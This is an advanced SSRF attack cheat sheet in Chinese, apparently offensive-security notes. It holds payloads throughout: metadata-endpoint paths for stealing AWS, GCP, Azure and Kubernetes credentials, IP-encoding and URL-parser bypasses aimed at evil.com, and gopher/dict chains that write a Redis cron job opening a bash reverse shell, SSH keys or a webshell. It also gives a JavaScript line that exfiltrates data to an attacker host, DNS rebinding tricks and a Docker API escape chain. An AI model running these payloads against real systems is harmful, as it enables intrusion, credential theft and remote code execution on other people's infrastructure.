# SSRF 进阶专题

> 云元数据全目录、URL 解析器差异、gopher/dict 注入、DNS 重绑定、PDF 生成器 SSRF、内网服务利用。
> 基础速查见 web-vulnerabilities.md §1.3。

---

## 1. 攻击面与 IP 绕过

**参数**：loc/url/path/endpoint/imageUrl/dest/redirect/uri/callback/load/file/resource/src。**非显式**：PDF/截图生成、Webhook、CSV/RSS 导入、OAuth redirect_uri、X-Forwarded-Host、XXE 实体、GraphQL `@link`。参数名补充变体：share/wap/link/target/u/3g/display/sourceURL/imageURL/domain。

**确认**：interactsh 回调 → 时间差（开放端口快/关闭慢）→ localhost 端口清单（8080/22/6379/9200/5984/**2375 Docker**/4840）→ 错误差异（not found vs refused vs timeout 摸拓扑）。

**file 协议内网横向三步**（无回显限制时的标准链）: ①`file:///etc/hosts` 看本机网卡/网段 → ②`file:///proc/net/arp` 读 ARP 缓存表拿存活内网主机（python 循环替换末位 1-254 爆网段同理） → ③`dict://<内网IP>:<port>` 逐端口探测开放服务（python 并发循环 1-65535）→ 定位 Redis/FastCGI 等再用 gopher 打。Windows 路径 `file://D:/images/1.png`（盘符即 host 位）。

**localhost 变体**：`127.1`｜`127.000.000.001`｜`0x7f000001`｜`2130706433`｜`0177.0000.0000.0001`｜`[::]`/`[::1]`/`[::ffff:127.0.0.1]`。
**元数据变体**：`2852039166`｜`0xa9fea9fe`｜`0251.0376.0251.0376`｜`[::ffff:169.254.169.254]`｜`[fd00:ec2::254]`｜`*.nip.io`。

## 2. 云元数据目录

| 云 | 端点 | 认证 |
|---|---|---|
| AWS IMDSv1 | `169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]`、user-data、public-keys | 无（最高危） |
| AWS IMDSv2 | PUT `/latest/api/token`（TTL 头）→ GET + token 头 | SSRF 支持自定义头即绕过；重绑定从实例自身打无 XFF |
| AWS ECS | `169.254.170.2/v2/credentials/<GUID>`（GUID 在 AWS_CONTAINER_CREDENTIALS_RELATIVE_URI） | 无 |
| Lambda | `file:///proc/self/environ`（AK/SK/Token） | — |
| GCP | `metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`；`?recursive=true` 全量；`v1beta1` 可能免头 | `Metadata-Flavor: Google` |
| Azure | `169.254.169.254/metadata/instance`、`/identity/oauth2/token?resource=https://management.azure.com/`；App Service 是 `169.254.130.1` | `Metadata: true` |
| 阿里云 | `100.100.100.200/latest/meta-data/`、`ram/security-credentials/[ROLE]` | 无 |
| OCI | `169.254.169.254/opc/v1/instance/`、`/identity/key.pem` | `Authorization: Bearer Oracle` |
| DO/Hetzner/OpenStack | `169.254.169.254/metadata/v1/`、`/hetzner/v1/metadata`、`/openstack/latest/meta_data.json` | 无 |

**K8s**：`file:///var/run/secrets/kubernetes.io/serviceaccount/token`｜`kubernetes.default.svc/api/v1/namespaces/kube-system/secrets`｜kubelet `NODE_IP:10255/pods`（常免认证）｜etcd `NODE_IP:2379/v2/keys/registry/secrets/`（极危）｜kubectl proxy `127.0.0.1:8001`。

## 3. URL 解析器差异

过滤器与 HTTP 客户端解析不一致 → 过滤看 safe.com、实际连 evil.com：

| 技巧 | Payload | 差异点 |
|---|---|---|
| @userinfo | `http://safe.com:80@evil.com/`、`http://safe.com%00@evil.com/` | 正则见 safe.com，解析器取 evil.com |
| 反斜杠 | `http://evil.com\@safe.com/` | PHP 取 safe.com；Node/cURL 把 `\` 当 `/` 连 evil.com |
| fragment | `http://evil.com#@safe.com/` | # 后是 fragment，host=evil.com |
| 空字节 | `%00` 截断 | Python/PHP/老 cURL 截断见 safe.com |
| IPv6 映射 | `[::ffff:127.0.0.1]` | 滤 IPv4 不滤 IPv6 |
| 三斜杠 | `file://evil.com/x` | Windows cURL 走 SMB |

**补充**：全角/带圈 Unicode（`①②⑦.⓪.⓪.①`）｜hex/octal 字节（`0x7f.0x0.0x0.0x1`）｜开放重定向链/短链接（trusted.com 302 → 内网）｜CRLF 注入头（`/%0D%0AHost:%20169.254.169.254`）｜HTTPS 站 302 到 HTTP 降级｜多重 @（`http://a.com@b.com@c.com/`）PHP parse_url 取**最后一个** @ 后（c.com）而 libcurl 取**第一个** @ 后（b.com）——校验器与请求器分属两套解析时定向错位。

## 4. gopher:// 与 dict://

格式：`gopher://HOST:PORT/_<URL编码数据>`（`_` 被丢弃）。编码 `\r`→%0D、`\n`→%0A、空格→%20；端点先解码一次则双重编码 `%250D%250A`。

- **Redis 写 crontab**：FLUSHALL → SET 1 `"\n\n*/1 * * * * bash -i >& /dev/tcp/A/4444 0>&1\n\n"` → CONFIG SET dir /var/spool/cron/ + dbfilename root → SAVE（限定: ubuntu/debian 下写 crontab 反弹常失败——crontab 实现差异，CentOS 成功率高; gopher 手工拼包时 RESP `$N` 长度须随 payload 实际字节数同步改）
- **Redis 写 SSH key**：dir /root/.ssh/ + authorized_keys；**写 webshell**：dir /var/www/html/ + shell.php
- **MySQL**（空密码/skip-grant）：认证包；**SMTP**（25）：HELO/MAIL FROM/DATA 全流程；**FastCGI**（9000）：PHP_VALUE=auto_prepend_file=php://input；**Memcached**（11211）：stats / 伪造 session
- **Gopherus 自动生成**：`--exploit mysql|redis|fastcgi|smtp`
- **gopher 协议四坑**（version-sensitive）: ①curl<7.45 会截断 payload 中的 %00（FastCGI EXP 含 %00，需 libcurl≥7.45）②PHP curl 默认不跟随 302（需 CURLOPT_FOLLOWLOCATION 显式开启）③file_get_contents() 场景的 gopher payload 不能 URL 编码（与 curl 相反）④file_get_contents() 跟随 302 到 gopher 有 BUG 常失败——探测 SSRF sink 类型（curl vs file_get_contents）决定编码与跳转策略
- **302 协议升级**: 过滤只允许 http(s) 前缀时，可控服务器 302 `Location: gopher://127.0.0.1:port/...`（或 file:///dict://）——curl 跟随跳转不检查目标协议（除非 CURLOPT_PROTOCOLS 限制）; Discuz X3.2 `forum.php?mod=ajax&action=downremoteimg&message=[img]http://evil/test.php?a.jpg[/img]` 远程图拉取即此模式

**file 协议与伪协议头**: ①curl 的 `file://任意host/path` 仍读本地文件（host 被忽略）——过 host 白名单后拼 `?` 截断尾部自动补的 `/`（`file://www.baidu.com/etc/flag?`）②file_get_contents() 把不认识的伪协议头当文件夹名，`httpsssss://../../../../etc/passwd` 即相对路径跨目录读（报错路径确认解析行为）

**dict://**：`dict://127.0.0.1:6379/INFO`、`CONFIG:SET:dir:...`、`SET:key:...`、`BGSAVE`。其他：sftp://（收凭据哈希）、ldap://、ftp://。

## 5. DNS 重绑定

**流程**：解析得公网 IP 过检 → TTL=0 → 实际请求时重解析得内网 IP。

**前提（TOCTOU 两次解析）**：`http_get(hostname)`（库内重解析）✅ 可利用；`http_get(ip)`（用已解析 IP）❌ 不可利用。

**工具**：`rbndr.us`（`7f000001.01020304.rbndr.us` 交替返回）、ceye.io、singularity（nccgroup）、dnslib 自建 TTL=0。缓存场景用并发竞争。**浏览器侧**：同源 JS 在重解析后读内网响应（0.0.0.0=localhost、CNAME 链）。**K8s 案例**：CVE-2020-8555（glusterfs/quobyte provisioner SSRF）→ 修复绕过 CVE-2020-8562（重绑定）。

## 6. PDF 生成器与内网利用

| 生成器 | 触发 |
|---|---|
| wkhtmltopdf | iframe/img/link/@import/JS document.write；`file:///etc/passwd` |
| WeasyPrint | CSS url()；`<link rel="attachment" href="file:///etc/passwd">`（文件嵌入 PDF） |
| Chrome Headless | 完整 JS：fetch 内网渲染进 body；WebSocket 探端口；dns-prefetch OOB |
| PhantomJS | page.open() |

**输出不可见外带**：`new Image().src='http://attacker/exfil?data='+btoa(t)`；长数据切 60 字节进 DNS 子域。**UA 指纹**：wkhtmltopdf/HeadlessChrome/PhantomJS/WeasyPrint。**DevTools 9222 暴露**：`/json` 列目标 → WebSocket 全控。

**内网服务**：Docker 2375（create + Binds 宿主逃逸）｜ES 9200（`_cat/indices`、`_search?q=*`）｜Spring actuator（`/env`、`/shutdown`）｜管理面板 8080/admin。

**WebLogic CVE-2014-4210**：`/uddiexplorer/SearchPublicRegistries.jsp?operator=http://内网:端口` 响应差异探端口；CRLF 打 Redis（`operator=http://REDIS:6379/test%0D%0A%0D%0Aset...`）。

**WooYun 触发点**：URL 代理/转发、图片加载、截图/PDF、Webhook、导入、OAuth 回调。**代理配置不当**：Web Server 代理未限目标 → 经代理达内网。**信息链**：主机发现 → 未授权面板 → 未认证 Redis → Docker 逃逸 → 元数据凭据 → C 段横向。


## N. 校验实现与协议走私增补
- **curl 重定向溢出**: CURLOPT_MAXREDIRS 超限后错误分支拿 CURLINFO_REDIRECT_URL 无校验再请求——重定向链恰好超限即打内网
- **白名单正则未转义点**: `meepwntube.0x1337.space`（. 未转义）→ 注册 meepwntubex0x1337.space + A→127.0.0.1
- **SNI 明文走私**: TLS ClientHello 的 SNI 是明文——对"解析原始字节"的服务（
/  当终止符的 FTP）构造 hostname 使 SNI 字节构成合法命令；浏览器拒说目标协议时的信道
- **PHP SoapClient gadget**: user_agent/uri CRLF 走私 + 反序列化后任意方法调用触发 __call() 发请求——unserialize 入口+方法调用点即 SSRF（内置类无依赖）
- **凭据跟随泄露**: 服务端 fetch 用户 URL 且客户端库默认带 Authorization → nc 监听即收 Basic 凭据
- **WeasyPrint attachment**: `<a/link rel="attachment" href>` 独立 fetch 路径——file:// 读文件嵌 PDF（pdfdetach 提取）/ 200 则 PDF 含 /Type /EmbeddedFile 作盲 oracle（CVE-2024-28184）
- **Docker API 细节**: GET-only SSRF 时 `/containers/<id>/archive?path=/flag.txt` 直接读容器文件（tar 格式）; POST 需内网请求转发端点中继 exec 创建+启动（id 见 sst/内存库）

**Python idna 转换段绕 hostname 三重检查**: 校验 host→逐标签 encode('idna').decode('utf-8')→再校验→urlopen 的结构——第一次传含 Unicode 字符（如 ℭ U+212D）host，转换后标签变目标 ASCII（cℭ→cc）通过末次检查; 枚举脚本: 遍历 U+128-65536 找 encode('idna') 结果含目标字母且无 - 的码点（Chrome 侧 IDNA 全角归一化见 xss-advanced）; **增补行**: curl .netrc 凭据在跨伺服重定向 + 401 WWW-Authenticate Basic 时转发给 B（CVE-2025-0167）; Python urlsplit("<URL:http://...>") scheme 为空但 urlretrieve 照抓（校验器/执行器解析差; 换行前缀变体）; Uvicorn（FastAPI 默认 ASGI）响应头不滤 CRLF——未修复 n-day（头注入/缓存投毒/XSS）; CherryPy RFC 2047 头解码引入 CRLF 请求拆分; Waitress 非法 method 报错回显可外带 cookie（CRLF 把 cookie 挪到 method 位）。
